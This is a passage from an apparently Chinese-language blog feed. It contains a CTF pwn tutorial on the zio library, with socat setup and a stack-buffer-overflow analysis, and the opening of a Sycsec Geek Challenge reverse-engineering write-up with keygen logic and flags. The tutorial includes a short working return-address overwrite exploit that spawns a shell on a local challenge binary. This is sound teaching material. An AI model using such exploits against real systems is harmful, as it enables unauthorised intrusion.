class="string">&#x27;useragent&#x27;</span>)):</span><br><span class="line">  buf += chr(i^ord(<span class="string">&#x27;useragent&#x27;</span>[i])</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> iæ˜¥ç§‹-ç™¾åº¦æ¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€æ¬¡åŸºäºzioç¼–å†™pwnçš„expçš„å°è¯•</title>
      <link href="Based-on-zio-exp-first-attempt.html"/>
      <url>Based-on-zio-exp-first-attempt.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="ZIO"><a href="#ZIO" class="headerlink" title="ZIO"></a>ZIO</h1><h2 id="ZIOç®€ä»‹"><a href="#ZIOç®€ä»‹" class="headerlink" title="ZIOç®€ä»‹"></a>ZIOç®€ä»‹</h2><p>zioæ˜¯ä¸€ä¸ªä¸“é—¨ä¸ºCTF PWNå¼€å‘çš„Pythonåº“ï¼ŒåŸºäºzioå¯ä»¥æ–¹ä¾¿å®ç°å¯¹è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„æœåŠ¡ç¨‹åºè¿›è¡Œæ•°æ®è¯»å†™æ“ä½œã€‚ä¸ä»…å¦‚æ­¤ï¼Œzioç”šè‡³è¿˜æ”¯æŒå¯¹æœ¬åœ°ç¨‹åºçš„æ•°æ®è¯»å†™æ“ä½œã€‚<br>zioæ˜¯ä¸€ä¸ªå¼€æºé¡¹ç›®ï¼Œå…¶åœ¨GitHubä¸Šçš„å®˜æ–¹é¡¹ç›®åœ°å€ä¸º <a href="https://github.com/zTrix/zio">https://github.com/zTrix/zio</a>ã€‚zioé»˜è®¤åªæ”¯æŒLinuxå’ŒMac OSXç³»ç»Ÿï¼Œå¦‚æœéœ€è¦åœ¨Windowsä¸‹ä½¿ç”¨å¯èƒ½éœ€è¦é¢å¤–å®‰è£…ä¸€äº›Pythonæ‰©å±•åŒ…ï¼Œæˆ–è€…éœ€è¦è‡ªå·±å¯¹zioçš„ä»£ç è¿›è¡Œç›¸å…³çš„ä¿®æ”¹</p><h2 id="å¸¸ç”¨å‡½æ•°"><a href="#å¸¸ç”¨å‡½æ•°" class="headerlink" title="å¸¸ç”¨å‡½æ•°"></a>å¸¸ç”¨å‡½æ•°</h2><h3 id="ä¸è¿œç¨‹æœåŠ¡å™¨å»ºç«‹è¿æ¥"><a href="#ä¸è¿œç¨‹æœåŠ¡å™¨å»ºç«‹è¿æ¥" class="headerlink" title="ä¸è¿œç¨‹æœåŠ¡å™¨å»ºç«‹è¿æ¥"></a>ä¸è¿œç¨‹æœåŠ¡å™¨å»ºç«‹è¿æ¥</h3><p>zio(target)ï¼Œå…¶ä¸­targetæ˜¯ä¸€ä¸ªå…ƒç»„ï¼Œå³(IP, PORT)ï¼Œå…¶ä¸­IPæ˜¯å­—ç¬¦ä¸²å½¢å¼çš„IPåœ°å€ï¼ŒPORTæ˜¯æ•°å­—å½¢å¼çš„ç«¯å£å·</p><h3 id="ä»è¿œç¨‹æœåŠ¡å™¨è¯»å–æ•°æ®"><a href="#ä»è¿œç¨‹æœåŠ¡å™¨è¯»å–æ•°æ®" class="headerlink" title="ä»è¿œç¨‹æœåŠ¡å™¨è¯»å–æ•°æ®"></a>ä»è¿œç¨‹æœåŠ¡å™¨è¯»å–æ•°æ®</h3><ol><li><p>readï¼Œç›´æ¥ä»è¿œç¨‹æœåŠ¡å™¨è¯»å–æ•°æ®ï¼›</p></li><li><p>readlineï¼Œä»è¿œç¨‹æœåŠ¡å™¨è¯»å–ä¸€è¡Œæ•°æ®ï¼›</p></li><li><p>read_until(pattern)ï¼Œä»è¿œç¨‹æœåŠ¡å™¨è¯»å–æ•°æ®ï¼Œç›´åˆ°é‡åˆ°patternå­—ç¬¦ä¸²</p><h3 id="å‘è¿œç¨‹æ•°æ®å‘é€æ•°æ®"><a href="#å‘è¿œç¨‹æ•°æ®å‘é€æ•°æ®" class="headerlink" title="å‘è¿œç¨‹æ•°æ®å‘é€æ•°æ®"></a>å‘è¿œç¨‹æ•°æ®å‘é€æ•°æ®</h3></li><li><p>write </p></li><li><p>writeline å‘è¿œç¨‹æœåŠ¡å™¨å†™æ•°æ®ï¼ˆåœ¨æ•°æ®æœ«å°¾è‡ªåŠ¨æ·»åŠ æ¢è¡Œç¬¦ï¼‰</p><h3 id="ä¸æœåŠ¡å™¨å»ºç«‹shelläº¤äº’"><a href="#ä¸æœåŠ¡å™¨å»ºç«‹shelläº¤äº’" class="headerlink" title="ä¸æœåŠ¡å™¨å»ºç«‹shelläº¤äº’"></a>ä¸æœåŠ¡å™¨å»ºç«‹shelläº¤äº’</h3><p>interactï¼Œåœ¨æˆåŠŸè·å–æœåŠ¡å™¨æ§åˆ¶æƒé™ä¹‹åï¼Œæˆ‘ä»¬éœ€è¦å»ºç«‹ä¸€ä¸ªshellæ¥å¯¹è¿œç¨‹æœåŠ¡å™¨è¿›è¡Œç®¡ç†ï¼Œä½¿ç”¨zioçš„interactå‡½æ•°å³å¯å®Œæˆè¿™ä¸€åŠŸèƒ½ã€‚</p><p>å¯ä»¥çœ‹åˆ°ï¼ŒåŸºäºzioç¼–å†™ä»£ç çœå»äº†è‡ªå·±å»ºç«‹socatè¿æ¥è¿™ä¸€è¿‡ç¨‹ï¼Œè€Œä¸”ä½¿ç”¨zioå°è£…çš„read/writeæ¥å£æ›¿ä»£socketçš„recv/sendæ¥å£ï¼Œä½¿å¾—ä»£ç æ›´åŠ å…·æœ‰å¯è¯»æ€§ã€‚</p></li></ol><h1 id="ç©pwnæ˜¯å°‘ä¸äº†æœåŠ¡çš„æ­å»ºçš„"><a href="#ç©pwnæ˜¯å°‘ä¸äº†æœåŠ¡çš„æ­å»ºçš„" class="headerlink" title="ç©pwnæ˜¯å°‘ä¸äº†æœåŠ¡çš„æ­å»ºçš„"></a>ç©pwnæ˜¯å°‘ä¸äº†æœåŠ¡çš„æ­å»ºçš„</h1><p>è™½ç„¶zioæœ‰è‡ªå·±å»ºç«‹socatçš„è¿‡ç¨‹ ä½†æ˜¯å´æ²¡æœ‰è®©ç¨‹åºåœ¨åº”è¯¥è¢«ç›‘å¬çš„ç¯å¢ƒä¸‹</p><h2 id="æ–¹æ³•"><a href="#æ–¹æ³•" class="headerlink" title="æ–¹æ³•"></a>æ–¹æ³•</h2><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><p>apt-get insatll socat</p><h3 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:10002,fork EXEC:.&#x2F;pwn</span><br></pre></td></tr></table></figure><h3 id="ç¬¬äºŒæ¬¡å¤ç”¨"><a href="#ç¬¬äºŒæ¬¡å¤ç”¨" class="headerlink" title="ç¬¬äºŒæ¬¡å¤ç”¨"></a>ç¬¬äºŒæ¬¡å¤ç”¨</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-LISTEN:10002,reuseaddr,fork EXEC:~.&#x2F;CTF&#x2F;pwn</span><br></pre></td></tr></table></figure><p>##ã€€é€šç”¨ä»£ç </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">curdir = os.path.abspath(os.getcwd())</span><br><span class="line">num = curdir.split(<span class="string">&quot;/&quot;</span>)[<span class="number">-1</span>]</span><br><span class="line">file = <span class="string">&quot;pwn&quot;</span> + num</span><br><span class="line">cmd +[<span class="string">&quot;socat&quot;</span>,<span class="string">&quot;TCP-LISTEN:2333 %s,reuseaddr,fork&quot;</span> % num, <span class="string">&quot;EXEC:./%s&quot;</span> %file]</span><br><span class="line">server.wait()</span><br></pre></td></tr></table></figure><h1 id="ç¨‹åºåˆ†æ"><a href="#ç¨‹åºåˆ†æ" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h1><p>è™½ç„¶å¼€å§‹ç©pwnäº† ç„¶è€Œlinuxä¸‹çš„ç¨‹åºç”¨<code>gdb</code>åˆ†æè¿˜æ˜¯ä¸æ€ä¹ˆä¹ æƒ¯ æ‰€ä»¥å³ä½¿æ˜¯è¿™ä¸€æ¬¡çš„åšæ–‡ï¼Œç¬”è€…ä¹Ÿæ²¡æœ‰ç”¨å¤šå°‘çš„è°ƒè¯•æŠ€å·§ åªæ˜¯ç”¨ <code>IDA</code>çœ‹äº†çœ‹ç¨‹åºè€Œå·² ä¾æ—§åªæ˜¯ä¸ºæœªå…¥é—¨æ°´å¹³ã€‚ æ„Ÿå¹é˜¿<br>å¯¹ç¨‹åºçš„mainå‡½æ•°è¯•ç”¨IDAçš„F5åŠŸèƒ½ å³å°†æ±‡ç¼–è½¬åŒ–æˆä¼ªä»£ç </p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-01.jpg"></a></p><p>è¿™é‡Œæœ‰ä¸¤ä¸ªå‡½æ•° ä¸€ä¸ªæ˜¯ <code>be_nice_to_people</code> è¿™ä¸ªä»…ä»…åªæ˜¯é€šè¿‡getegidè·å–è¿›ç¨‹çš„æœ‰æ•ˆç»„IDï¼ˆeffective group IDï¼‰ï¼Œéšåå°†æœ‰æ•ˆç»„IDå½“ä½œå‚æ•°ä¼ é€’ç»™setresgidå‡½æ•°ã€‚setresgidç”¨äºè®¾ç½®çœŸå®çš„ã€æœ‰æ•ˆçš„å’Œä¿å­˜è¿‡çš„ç»„æ ‡è¯†å·ã€‚ç»¼ä¸Šæ‰€è¿°ï¼Œbe_nice_to_peopleçš„ä½œç”¨å°±æ˜¯è®¾ç½®pwn1è¿›ç¨‹è‡ªèº«çš„ä¸€äº›æƒé™ä¿¡æ¯ï¼Œè¿™é‡Œä¸åšè¿‡å¤šä»‹ç»ã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-02.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-02.jpg"></a></p><p>å¹¶æ²¡æœ‰å¯åˆ©ç”¨ç‚¹</p><p>è¿˜æœ‰ä¸€ä¸ªå‡½æ•°æ˜¯<code>vulnerable_function</code></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-03.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-03.jpg"></a></p><p>æ ˆä¸Šå®šä¹‰äº†ä¸€ä¸ªç¼“å†²åŒºï¼Œå¹¶é€šè¿‡<code>read</code>å‡½æ•°æ¥è¯»å–æ•°æ®å­˜æ”¾åˆ°è¿™ä¸ªç¼“å†²åŒºé‡Œé¢ï¼ˆæœ€å¤šè¯»å–0x100ä¸ªå­—èŠ‚ï¼‰<br>å¦‚æœè¿™é‡Œçš„<code>buf</code>æ¯”0x10å°çš„è¯ï¼Œé‚£ä¹ˆè¿™é‡Œå°±ä¼šæœ‰ä¸€ä¸ªæº¢å‡º é—®é¢˜bufæœ‰å¤šå¤§å‘¢ï¼Ÿå’±ä»¬ç»§ç»­åˆ†æ å›åˆ°åŸæ¥çš„æ±‡ç¼–è¯­è¨€çŠ¶æ€<br>  åœ¨IDAçš„â€œIDA View-Aâ€é€‰é¡¹å¡ä¸­ï¼Œå¯ä»¥çœ‹åˆ°vulnerable_functionå¯¹åº”çš„åæ±‡ç¼–æŒ‡ä»¤åˆ—è¡¨å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-04.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-04.jpg"></a></p><p>å¯ä»¥çœ‹å‡ºæ¥è¿™é‡Œç¼“å†²åŒºçš„èµ·å§‹åœ°å€ä¸ºebp-0x88ï¼Œè€ŒreadæŒ‡å®šçš„å­—èŠ‚æ•°ä¸º0x100ï¼Œé‚£ä¹ˆæ˜¾ç„¶è¿™é‡Œå°±æ˜¯ä¸€ä¸ªæº¢å‡ºç‚¹<br>ç”»ä¸ªåˆ—è¡¨åˆ†æä¸€ä¸‹</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-05.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-05.jpg"></a></p><p> å¯ä»¥çœ‹å‡ºè¦è¦†ç›–åˆ°è¿”å›åœ°å€éœ€è¦0x88 + 4 = 140å­—èŠ‚çš„æ•°æ®ï¼Œå³ç¬¬141~144å­—èŠ‚çš„æ•°æ®å¯ä»¥ç”¨äºè¦†ç›–å‡½æ•°çš„è¿”å›åœ°å€ã€‚</p><p>åœ¨è¿™ä¹‹å‰æˆ‘çŸ¥é“äº†pwnç¨‹åºå¼€å¯äº†NXï¼ˆæ— æ³•æŠŠæ ˆä¸Šçš„æ•°æ®å½“ä½œä»£ç æ¥æ‰§è¡Œï¼‰ï¼ˆç”¨checksec.shå¯ä»¥æ£€æµ‹å‡ºæ¥ï¼‰<br>æ‰€ä»¥æˆ‘å¼€å§‹å°è¯•çœ‹pwnç¨‹åºä¸­æ˜¯å¦æœ‰è°ƒç”¨system(â€œ/bin/bashâ€)çš„ä»£ç ï¼Œå¦‚æœæœ‰çš„è¯ç›´æ¥æ§åˆ¶EIPè·³è½¬è¿‡å»æ‰§è¡Œå³å¯ã€‚<br>ç°åœ¨ç»§ç»­ä½¿ç”¨IDAè¿›è¡Œåˆ†æã€‚åœ¨IDAä¸­åˆ‡æ¢åˆ°Importsé€‰é¡¹å¡æŸ¥çœ‹ç¨‹åºçš„å¯¼å…¥å‡½æ•°åˆ—è¡¨ï¼Œå‘ç°å…¶ä¸­å­˜åœ¨æœ‰å¯¹systemå‡½æ•°çš„è°ƒç”¨ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-06.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-06.jpg"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-07.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/zio-07.jpg"></a></p><p>è¿™é‡Œçš„not_calledå°±æ˜¯æˆ‘ä»¬è¦æ‰¾çš„å‡½æ•°ï¼Œå¯¹åº”çš„åœ°å€ä¸º0x080484A4ï¼Œæˆ‘ä»¬æ§åˆ¶EIPè·³è½¬åˆ°0x080484A4æ‰§è¡Œä»£ç å³å¯</p><h1 id="expçš„ç¼–å†™"><a href="#expçš„ç¼–å†™" class="headerlink" title="expçš„ç¼–å†™"></a>expçš„ç¼–å†™</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp_pwn</span>()ï¼š</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># è°ƒç”¨<span class="title">zio</span>æ„é€ å‡½æ•°ä¸æœåŠ¡å™¨é“¾æ¥</span></span><br><span class="line">io = zio((&#x27;127.0.0.1&#x27;,2333))</span><br><span class="line"><span class="comment">#l32ä¸ºzioæä¾›çš„ç”¨äºå°†32ä½æ•´æ•°ï¼ˆå°ç«¯æ¨¡å¼ï¼‰è½¬åŒ–ä¸ºå­—ç¬¦ä¸²çš„å‡½æ•°</span></span><br><span class="line"></span><br><span class="line">ret_addr = l32(<span class="number">0x080484A4</span>)</span><br><span class="line"><span class="comment"># æ„é€ payload</span></span><br><span class="line">payload =<span class="string">&#x27;A&#x27;</span>*<span class="number">140</span>+ret_addr</span><br><span class="line"><span class="comment"># å‘é€æ•°æ®</span></span><br><span class="line">io.writeline(payload)</span><br><span class="line"><span class="comment"># è·å–æœåŠ¡å™¨æ§åˆ¶æƒé™åå½¢æˆçš„shell</span></span><br><span class="line">io.interact()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> exp_pwn()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Other </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> zio </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sycsec-æå®¢å¤§æŒ‘æˆ˜-Writeup</title>
      <link href="2016-sycgeek-Writeup.html"/>
      <url>2016-sycgeek-Writeup.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>   æ¯•ç«Ÿæˆ‘ä¸æ˜¯æwebçš„ï¼Œæ‰€ä»¥æœ¬æ–‡ä¸»è¦å†™çš„å†…å®¹ï¼Œä¸»è¦æ˜¯å†™äºŒè¿›åˆ¶çš„ï¼Œä½†æ˜¯æˆ‘ä¹Ÿä¸æ˜¯æç§»åŠ¨ç«¯å’Œå®‰å“çš„ï¼Œæ‰€ä»¥æˆ‘æœ¬ç¯‡æ–‡ç« çš„å†…å®¹ä¸»è¦æ˜¯reverseå’Œpwnã€‚<br>â€‹    å…¶æ¬¡å‘¢ï¼Œå› ä¸ºç¬”è€…èƒ½åŠ›æœ‰é™ï¼Œæ‰€ä»¥å¦‚æœæœ‰å“ªä¸ªåœ°æ–¹å†™é”™äº†ï¼Œæˆ–è€…å†™å¾—ä¸å¥½ï¼Œæ¬¢è¿å¤§å®¶æŒ‡å‡ºï¼Œè°¢è°¢ã€‚</p><p>æ¯”èµ›åœ°å€ï¼š<a href="http://geek.sycsec.com/">http://geek.sycsec.com/</a><br>â€‹    è¿˜æœ‰ä¸€ç‚¹å°±æ˜¯ï¼Œè¿™ä¸ªæ¯”èµ›æ˜¯æˆä¿¡ä¸‰å¶è‰å‡†å¤‡æ‹›æ–°çš„é¢˜ç›®ï¼Œæ‰€ä»¥å¾ˆå¤šåœ°æ–¹éƒ½æ˜¯æŒºé€‚åˆå…¥é—¨è€…å­¦ä¹ çš„ï¼Œæ‰€ä»¥å¤§ç¥å°±åˆ«æ¥çœ‹äº†ã€‚<br>äºŒè¿›åˆ¶é¢˜ç›®æ‰“åŒ…[ä¸‹è½½</p><p>](<a href="http://pan.baidu.com/s/1nuJ1cDF">http://pan.baidu.com/s/1nuJ1cDF</a>)<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/base.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/base.png"></a></p><h1 id="Ernie"><a href="#Ernie" class="headerlink" title="Ernie"></a>Ernie</h1><p>è¿™ä¸ªé¢˜ç›®æŒºæœ‰æ„æ€çš„<br>ä¸»è¦çœ‹çš„æ˜¯åå­—çš„nameçš„é•¿åº¦ï¼Œå¹¸è¿æ•°å­—ï¼Œä»¥åŠKeyçš„å€¼</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-sycgeek-01.jpg" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-sycgeek-01.jpg"></a><br>ï¼ˆè¿è¡Œæˆªå›¾ï¼‰</p><p>è´´å‡ºå…³é”®ä»£ç </p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-key_1.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-key_1.png"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-key_2.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-key_2.png"></a></p><p>è¿™ä¸ªé¢˜ç›®é€»è¾‘è¿˜æ˜¯æŒºæ¸…æ™°çš„ï¼Œnameæ˜¯6ä½ï¼Œkeyåº”è¯¥æ˜¯16è¿›åˆ¶ï¼Œä¹Ÿå°±æ˜¯è¯´2ä½è½¬åŒ–æˆä¸€ä¸ªå­—ç¬¦ç»™S1ï¼Œkeyæœ¬æ¥åº”è¯¥æ˜¯32ä½ï¼Œé‚£ä¹ˆS1å°†æ˜¯16ä½</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-key3.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-key3.png"></a></p><p>è€Œè¿™ä¸€æ®µåˆ™è¯´æ˜äº†S1è¦ä¸è¿™é‡Œçš„çº¢æ¡†çš„å­—ç¬¦ä¸²ç›¸åŒï¼Œå­—ç¬¦ä¸²æ˜¯a_6sy2tcy3iy7seï¼Œæ‰€ä»¥è¾“å…¥çš„keyåº”è¯¥å°±S1çš„16è¿›åˆ¶å’¯ï¼Œ<br>ç»§ç»­å¾€ä¸‹çœ‹</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-key4.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-key4.png"></a></p><p>å…ˆè¿›å…¥ sub_8048717çš„å‡½æ•°çœ‹ä¸€çœ¼</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-8048717.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-8048717.png"></a></p><p>ç°åœ¨å·²çŸ¥v6==6ï¼Œè¿™é‡Œä¸èƒ½è®©jå°äº0ï¼Œæ‰€ä»¥åè¿‡æ¥æƒ³ï¼Œjåªèƒ½ä¸º6ï¼Œå¦‚æœjå°äº6é‚£ä¹ˆè‚¯å®šå°±ä¼šå°äº0ï¼Œå°±ä¸å¯¹äº†ã€‚flagå‡ºä¸æ¥äº†ï¼Œæ‰€ä»¥jåˆå§‹å€¼æ˜¯å¤§äº6çš„ï¼Œåˆ°6åœæ­¢ï¼Œä¸ºè¾¾åˆ°åœæ­¢æ¡ä»¶ï¼Œv3ä¸º6.<br>ç»§ç»­å¾€ä¸‹çœ‹ï¼Œå°†s1ä¸v3å¼‚æˆ–ï¼Œç„¶åè½¬åŒ–æˆå­—ç¬¦ä¸²ï¼Œä¹‹åå°±å¾—åˆ°flagäº†ã€‚</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-result.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-result.png"></a></p><h1 id="re100å°é€æ˜"><a href="#re100å°é€æ˜" class="headerlink" title="re100å°é€æ˜"></a>re100å°é€æ˜</h1><p>æ‹¿åˆ°æ–‡ä»¶  æŸ¥å£³ï¼Œæ²¡æœ‰<br>æ‰“å¼€ç¨‹åº</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-keygenme.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-keygenme.png"></a></p><p>è¿™çœ‹ç€åƒä¸€ä¸ªkeygenmeï¼Œé—®é¢˜æ¥äº†å¸å·å’Œå¯†ç æ˜¯ä»€ä¹ˆå‘¢</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-touming.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-touming.png"></a></p><p>è¿™æ˜¯å…³é”®ä»£ç ï¼Œè¿™é‡Œçš„é€»è¾‘æ˜¯usernameå’Œpasswordçš„é€»è¾‘<br>ï¼Œæ»¡è¶³çš„é€»è¾‘æ˜¯è¿™æ ·çš„ï¼š</p><p>usrname = â€˜xxxxxâ€™<br>buf = [11,70,23,32,32,61,17,44]</p><p>åˆ™keyæ»¡è¶³ï¼Œord(userame[i])-buf[i] = ord(key[i])<br>é—®é¢˜æ˜¯è¿™é‡Œæˆ‘å¹¶ä¸çŸ¥é“ç”¨æˆ·åä»€ä¹ˆï¼Œé¢˜ç›®ä¹Ÿæ²¡è¦æ±‚ç»™ï¼Œæˆ‘çœ‹åˆ°ç¨‹åºçš„çª—å£æœ‰ä¸ªSycloverï¼Œé‚£ä¹ˆå‡å®šè¿™æ˜¯ä¸€ä¸ªå…³äºSycloverçš„keygenmeçš„é—®é¢˜ï¼Œå°è¯•å¾—åˆ°è¿™ä¸ªç”¨æˆ·åçš„key</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-key_of_xiaotuoming.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-key_of_xiaotuoming.png"></a></p><p>å°è¯•æäº¤ï¼Œgetflag<br>SYC{H3LLOCTF}</p><h1 id="Re100-HelloWorld"><a href="#Re100-HelloWorld" class="headerlink" title="Re100-HelloWorld"></a>Re100-HelloWorld</h1><p>è¿™é¢˜å°±åªæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²æ¯”è¾ƒ<br>ç»™æ–°æ‰‹ä¸€ä¸ªæŠ€å·§ï¼Œåœ¨IDAä¸­shift+F12å¯ä»¥æœç´¢å­—ç¬¦ä¸²</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-hello_world.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-hello_world.png"></a></p><p>å¯ä»¥çœ‹åˆ°å‡ ä¸ªå…³é”®å­—ç¬¦ä¸²ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆplease input your nameçš„å­—ç¬¦ä¸²è¿›å»ä¹‹åæ‰¾ä¸åˆ°å…³é”®ï¼Œæˆ‘ç´¢æ€§å•æœºâ€œplease input your PassWordâ€ï¼Œ<br>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªæŠ€å·§ï¼Œå°†é¼ æ ‡æ”¾åˆ°å…³é”®åœ°æ–¹ï¼ŒæŒ‰â€˜Xâ€™é”®å¯ä»¥æŸ¥çœ‹äº¤å‰å¼•ç”¨</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-X_of_hello.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-X_of_hello.png"></a><br>ç‚¹å‡»OK</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-cmp_hello.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-cmp_hello.png"></a></p><p>çœ‹åˆ°äº†è¿™é‡Œæœ‰æŒ‰ä½è¿›è¡Œçš„å­—ç¬¦ä¸²æ¯”è¾ƒï¼Œä½†æ˜¯è¿™é‡Œåªèƒ½çœ‹åˆ°asciiç ä¸çŸ¥é“ï¼Œæ‰€å¯¹åº”çš„å­—ç¬¦æ˜¯ä»€ä¹ˆï¼Œè¿™é‡Œè¿˜æœ‰ä¸€ä¸ªæŠ€å·§ï¼Œæ˜¯IDAçš„Ré”®ï¼Œå¯ä»¥å°†16è¿›åˆ¶è½¬æˆå­—ç¬¦</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-resula_of_hello.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/16-syc-resula_of_hello.png"></a></p><p>æ‰€ä»¥æœ€åçš„ç»“æœæ˜¯ SYC{Hell0_W0rld}</p><h1 id="re50-é€ç¦åˆ©æ‹‰"><a href="#re50-é€ç¦åˆ©æ‹‰" class="headerlink" 